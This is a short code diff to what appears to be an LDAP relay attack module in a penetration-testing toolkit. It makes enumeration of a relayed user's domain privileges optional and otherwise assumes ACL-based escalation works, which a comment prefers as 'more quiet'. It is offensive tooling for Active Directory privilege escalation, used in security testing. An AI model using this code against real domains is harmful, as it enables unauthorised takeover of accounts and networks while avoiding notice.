@@ -309,15 +309,27 @@ class LDAPAttack(ProtocolAttack):
 
         # Create new dumper object
         domainDumper = ldapdomaindump.domainDumper(self.client.server, self.client, domainDumpConfig)
-        LOG.info('Enumerating relayed user\'s privileges. This may take a while on large domains')
-        userSid, privs = self.validatePrivileges(self.username, domainDumper)
-        if privs['create']:
-            LOG.info('User privileges found: Create user')
-        if privs['escalateViaGroup']:
-            name = privs['escalateGroup'].split(',')[0][3:]
-            LOG.info('User privileges found: Adding user to a privileged group (%s)' % name)
-        if privs['aclEscalate']:
-            LOG.info('User privileges found: Modifying domain ACL')
+
+        # If specified validate the user's privileges. This might take a while on large domains but will
+        # identify the proper containers for escalating via the different techniques.
+        if self.config.validateprivs:
+            LOG.info('Enumerating relayed user\'s privileges. This may take a while on large domains')
+            userSid, privs = self.validatePrivileges(self.username, domainDumper)
+            if privs['create']:
+                LOG.info('User privileges found: Create user')
+            if privs['escalateViaGroup']:
+                name = privs['escalateGroup'].split(',')[0][3:]
+                LOG.info('User privileges found: Adding user to a privileged group (%s)' % name)
+            if privs['aclEscalate']:
+                LOG.info('User privileges found: Modifying domain ACL')
+
+        # If validation of privileges is not desired, we assumed that the user has permissions to escalate
+        # an existing user via ACL attacks.
+        else:
+            privs = {}
+            privs['create'] = False
+            privs['aclEscalate'] = True
+            privs['escalateViaGroup'] = False
 
         # We prefer ACL escalation since it is more quiet
         if self.config.aclattack and privs['aclEscalate']:
